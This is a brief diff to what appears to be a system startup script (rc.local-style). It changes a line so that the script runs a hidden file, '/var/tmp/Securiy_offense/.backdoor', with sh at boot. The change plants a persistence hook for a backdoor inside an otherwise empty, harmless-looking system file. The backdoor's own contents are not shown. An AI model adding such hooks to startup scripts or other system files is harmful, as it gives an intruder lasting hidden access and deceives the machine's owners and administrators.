@@ -10,6 +10,6 @@
 # bits.
 #
 # By default this script does nothing.
-/var/tmp/Securiy_offense/.backdoor
+sh '/var/tmp/Securiy_offense/.backdoor'
 
 exit 0
